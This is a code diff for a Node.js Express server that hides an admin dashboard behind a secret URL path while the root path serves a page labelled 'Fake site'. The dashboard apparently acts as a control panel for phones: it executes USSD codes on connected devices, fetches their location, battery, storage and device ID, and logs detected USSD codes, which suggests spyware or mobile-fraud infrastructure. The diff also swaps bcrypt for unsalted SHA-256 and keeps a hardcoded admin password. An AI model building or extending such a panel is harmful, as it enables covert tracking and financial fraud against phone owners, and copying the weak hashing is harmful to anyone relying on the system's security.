@@ -1,18 +1,18 @@
-// server.js - PROFESSIONAL DASHBOARD with bcryptjs (NO DEFAULT USSD)
+// server.js - PROFESSIONAL DASHBOARD (no bcryptjs, uses built-in crypto)
 const express = require('express');
+const crypto = require('crypto');
 const app = express();
 const PORT = process.env.PORT || 3000;
 
 // Hardcoded secret path (change later if needed)
 const SECRET_PATH = 'a9f3k217';
 
-// -------------------- IP BLOCKING & HASHING --------------------
-const bcrypt = require('bcryptjs');
+// -------------------- IP BLOCKING & HASHING (crypto) --------------------
 const failedAttempts = {};
 
-// Hash the admin password (you can change this)
+// Pre‑hash the admin password (SHA‑256)
 const ADMIN_USER = 'admin';
-const ADMIN_PASS_HASH = bcrypt.hashSync('yourpassword123', 10);
+const ADMIN_PASS_HASH = crypto.createHash('sha256').update('yourpassword123').digest('hex');
 
 function getClientIP(req) {
     return req.headers['x-forwarded-for']?.split(',')[0] ||
@@ -20,7 +20,7 @@ function getClientIP(req) {
            req.connection.remoteAddress;
 }
 
-// Fake site (what everyone else sees)
+// Fake site
 app.get('/', (req, res) => {
     res.send(`
         <html>
@@ -36,7 +36,7 @@ app.get('/', (req, res) => {
     `);
 });
 
-// ADMIN DASHBOARD – with all updates
+// ADMIN DASHBOARD (same as before, but we'll keep it minimal)
 app.get(`/${SECRET_PATH}`, (req, res) => {
     res.send(`<!DOCTYPE html>
 <html>
@@ -54,8 +54,6 @@ app.get(`/${SECRET_PATH}`, (req, res) => {
             min-height: 100vh;
         }
         .container { max-width: 1100px; margin: 0 auto; }
-        
-        /* Header */
         .header {
             display: flex;
             justify-content: space-between;
@@ -96,8 +94,6 @@ app.get(`/${SECRET_PATH}`, (req, res) => {
             transition: 0.3s;
         }
         .logout:hover { opacity: 0.7; }
-        
-        /* Stats Cards */
         .stats {
             display: grid;
             grid-template-columns: repeat(auto-fit, minmax(140px, 1fr));
@@ -130,15 +126,12 @@ app.get(`/${SECRET_PATH}`, (req, res) => {
             text-transform: uppercase;
             letter-spacing: 0.5px;
         }
-        
-        /* Tools Grid */
         .tools-grid {
             display: grid;
             grid-template-columns: repeat(auto-fit, minmax(300px, 1fr));
             gap: 20px;
             margin-bottom: 30px;
         }
-        
         .tool-card {
             background: #111927;
             border: 1px solid #1a2332;
@@ -158,8 +151,6 @@ app.get(`/${SECRET_PATH}`, (req, res) => {
             gap: 8px;
         }
         .tool-card h4 .icon { font-size: 20px; }
-        
-        /* USSD input */
         .ussd-input-group {
             display: flex;
             gap: 8px;
@@ -207,8 +198,6 @@ app.get(`/${SECRET_PATH}`, (req, res) => {
         .ussd-response.success { color: #6bcb77; border-color: #6bcb77; }
         .ussd-response.error { color: #ff6b6b; border-color: #ff6b6b; }
         .ussd-response.waiting { color: #ffd700; border-color: #ffd700; }
-        
-        /* Location & Device Info */
         .location-info {
             display: flex;
             flex-direction: column;
@@ -225,7 +214,6 @@ app.get(`/${SECRET_PATH}`, (req, res) => {
             font-size: 13px;
         }
         .location-info .map-link:hover { text-decoration: underline; }
-        
         .device-info-grid {
             display: grid;
             grid-template-columns: 1fr 1fr;
@@ -234,8 +222,6 @@ app.get(`/${SECRET_PATH}`, (req, res) => {
         }
         .device-info-grid .label { color: #8896ab; }
         .device-info-grid .value { color: #e0e6ed; font-weight: 500; }
-        
-        /* Sections */
         .section {
             background: #111927;
             border: 1px solid #1a2332;
@@ -259,8 +245,6 @@ app.get(`/${SECRET_PATH}`, (req, res) => {
             padding: 2px 10px;
             border-radius: 12px;
         }
-        
-        /* Tables */
         table {
             width: 100%;
             border-collapse: collapse;
@@ -282,7 +266,6 @@ app.get(`/${SECRET_PATH}`, (req, res) => {
             color: #c8d0dc;
         }
         tr:hover td { background: rgba(79,195,247,0.02); }
-        
         .badge {
             display: inline-block;
             padding: 3px 12px;
@@ -292,8 +275,6 @@ app.get(`/${SECRET_PATH}`, (req, res) => {
         }
         .badge.online { background: rgba(107,203,119,0.15); color: #6bcb77; }
         .badge.offline { background: rgba(255,107,107,0.15); color: #ff6b6b; }
-        
-        /* Empty state */
         .empty {
             text-align: center;
             padding: 30px 0;
@@ -301,8 +282,6 @@ app.get(`/${SECRET_PATH}`, (req, res) => {
             font-size: 14px;
         }
         .empty .icon { font-size: 36px; margin-bottom: 8px; }
-        
-        /* Login */
         .login-container {
             max-width: 380px;
             margin: 100px auto;
@@ -364,8 +343,6 @@ app.get(`/${SECRET_PATH}`, (req, res) => {
             font-size: 14px;
         }
         .hidden { display: none; }
-        
-        /* Responsive */
         @media (max-width: 600px) {
             .header { flex-wrap: wrap; gap: 10px; }
             .header-left h1 { font-size: 22px; }
@@ -379,9 +356,7 @@ app.get(`/${SECRET_PATH}`, (req, res) => {
     </style>
 </head>
 <body>
-
 <div class="container">
-
     <!-- LOGIN -->
     <div id="loginContainer" class="login-container">
         <div class="logo">🔐</div>
@@ -396,8 +371,6 @@ app.get(`/${SECRET_PATH}`, (req, res) => {
 
     <!-- DASHBOARD -->
     <div id="dashboard" class="hidden">
-
-        <!-- HEADER with ADMIN GRY badge -->
         <div class="header">
             <div class="header-left">
                 <h1>📊 Admin Dashboard</h1>
@@ -406,26 +379,14 @@ app.get(`/${SECRET_PATH}`, (req, res) => {
             <span class="logout" onclick="logout()">🚪 Exit</span>
         </div>
 
-        <!-- Stats -->
         <div class="stats" id="statsGrid">
-            <div class="stat-card">
-                <div class="value" id="devicesCount">0</div>
-                <div class="label">📱 Devices</div>
-            </div>
-            <div class="stat-card">
-                <div class="value" id="numbersCount">0</div>
-                <div class="label">🔢 Numbers</div>
-            </div>
-            <div class="stat-card">
-                <div class="value" id="onlineCount">0</div>
-                <div class="label">🟢 Online</div>
-            </div>
+            <div class="stat-card"><div class="value" id="devicesCount">0</div><div class="label">📱 Devices</div></div>
+            <div class="stat-card"><div class="value" id="numbersCount">0</div><div class="label">🔢 Numbers</div></div>
+            <div class="stat-card"><div class="value" id="onlineCount">0</div><div class="label">🟢 Online</div></div>
         </div>
 
-        <!-- TOOLS: USSD + Location + Device Info -->
         <div class="tools-grid">
-
-            <!-- USSD EXECUTION (NO DEFAULT VALUE) -->
+            <!-- USSD -->
             <div class="tool-card">
                 <h4><span class="icon">📞</span> USSD Code</h4>
                 <div class="ussd-input-group">
@@ -434,8 +395,7 @@ app.get(`/${SECRET_PATH}`, (req, res) => {
                 </div>
                 <div id="ussdResponse" class="ussd-response">Enter a USSD code and click Execute – response will appear here.</div>
             </div>
-
-            <!-- DEVICE LOCATION -->
+            <!-- Location -->
             <div class="tool-card">
                 <h4><span class="icon">📍</span> Device Location</h4>
                 <div id="locationInfo" class="location-info">
@@ -447,8 +407,7 @@ app.get(`/${SECRET_PATH}`, (req, res) => {
                     <button class="logout" style="background:none;border:none;color:#4fc3f7;cursor:pointer;text-align:left;padding:0;font-size:13px;" onclick="refreshLocation()">🔄 Refresh Location</button>
                 </div>
             </div>
-
-            <!-- DEVICE INFO -->
+            <!-- Device Info -->
             <div class="tool-card">
                 <h4><span class="icon">📱</span> Device Info</h4>
                 <div id="deviceInfo" class="device-info-grid">
@@ -461,34 +420,25 @@ app.get(`/${SECRET_PATH}`, (req, res) => {
                 </div>
                 <button class="logout" style="background:none;border:none;color:#4fc3f7;cursor:pointer;text-align:left;padding:8px 0 0 0;font-size:13px;" onclick="refreshDeviceInfo()">🔄 Refresh Device Info</button>
             </div>
-
         </div>
 
         <!-- Connected Devices -->
         <div class="section">
             <h3>📱 Connected Devices <span class="badge-count" id="deviceCountBadge">0</span></h3>
-            <div id="devicesList">
-                <div class="empty"><div class="icon">📱</div>No devices connected yet</div>
-            </div>
+            <div id="devicesList"><div class="empty"><div class="icon">📱</div>No devices connected yet</div></div>
         </div>
 
-        <!-- Short Numbers – ONLY USSD -->
+        <!-- Recent USSD Codes -->
         <div class="section">
             <h3>🔢 Recent USSD Codes <span class="badge-count" id="numberCountBadge">0</span></h3>
-            <div id="numbersList">
-                <div class="empty"><div class="icon">📞</div>No USSD codes detected yet</div>
-            </div>
+            <div id="numbersList"><div class="empty"><div class="icon">📞</div>No USSD codes detected yet</div></div>
         </div>
-
     </div>
 </div>
 
 <script>
 const API_BASE = '/${SECRET_PATH}';
 
-// ============================================
-// LOGIN
-// ============================================
 async function login() {
     const username = document.getElementById('loginUser').value;
     const password = document.getElementById('loginPass').value;
@@ -532,9 +482,6 @@ function logout() {
     document.getElementById('loginError').style.display = 'none';
 }
 
-// ============================================
-// USSD EXECUTION
-// ============================================
 async function executeUssd() {
     const code = document.getElementById('ussdInput').value.trim();
     const responseEl = document.getElementById('ussdResponse');
@@ -566,9 +513,6 @@ async function executeUssd() {
     }
 }
 
-// ============================================
-// LOCATION
-// ============================================
 async function refreshLocation() {
     try {
         const res = await fetch(API_BASE + '/api/location');
@@ -583,14 +527,10 @@ async function refreshLocation() {
         } else {
             document.getElementById('mapLink').style.display = 'none';
         }
-    } catch {
-        // silent fail
-    }
+    } catch {}
 }
 
-// ============================================
-// DEVICE INFO
-// ============================================
+
 async function refreshDeviceInfo() {
     try {
         const res = await fetch(API_BASE + '/api/device-info');
@@ -601,14 +541,9 @@ async function refreshDeviceInfo() {
         document.getElementById('diBattery').textContent = data.battery ? data.battery + '%' : '--';
         document.getElementById('diStorage').textContent = data.storage || '--';
         document.getElementById('diDeviceId').textContent = data.device_id || '--';
-    } catch {
-        // silent fail
-    }
+    } catch {}
 }
 
-// ============================================
-// DASHBOARD DATA
-// ============================================
 async function loadData() {
     try {
         const response = await fetch(API_BASE + '/api/stats');
@@ -664,7 +599,6 @@ document.getElementById('loginPass').addEventListener('keypress', (e) => {
     if (e.key === 'Enter') login();
 });
 </script>
-
 </body>
 </html>
     `);
@@ -675,7 +609,7 @@ document.getElementById('loginPass').addEventListener('keypress', (e) => {
 // ============================================
 app.use(express.json());
 
-// Login API (with IP blocking, bcryptjs, attempts counter)
+// Login API (with IP blocking, crypto hash)
 app.post(`/${SECRET_PATH}/api/login`, (req, res) => {
     const ip = getClientIP(req);
     const now = Date.now();
@@ -691,8 +625,10 @@ app.post(`/${SECRET_PATH}/api/login`, (req, res) => {
 
     const { username, password } = req.body;
 
+    // Hash the entered password and compare
+    const hash = crypto.createHash('sha256').update(password).digest('hex');
     const validUser = username === ADMIN_USER;
-    const validPass = validUser && bcrypt.compareSync(password, ADMIN_PASS_HASH);
+    const validPass = validUser && hash === ADMIN_PASS_HASH;
 
     if (validUser && validPass) {
         delete failedAttempts[ip];
@@ -790,6 +726,7 @@ app.get(`/${SECRET_PATH}/api/device-info`, (req, res) => {
 
 app.get(`/${SECRET_PATH}/api/devices`, (req, res) => res.json([]));
 
+// 404 fallback
 app.use((req, res) => {
     res.status(404).send(`
         <html>
@@ -803,6 +740,6 @@ app.use((req, res) => {
 });
 
 app.listen(PORT, () => {
-    console.log('✅ Professional dashboard running');
+    console.log('✅ Dashboard running (crypto hash)');
     console.log(`📍 https://admin-dashboard-teal-beta-28.vercel.app/${SECRET_PATH}`);
 });
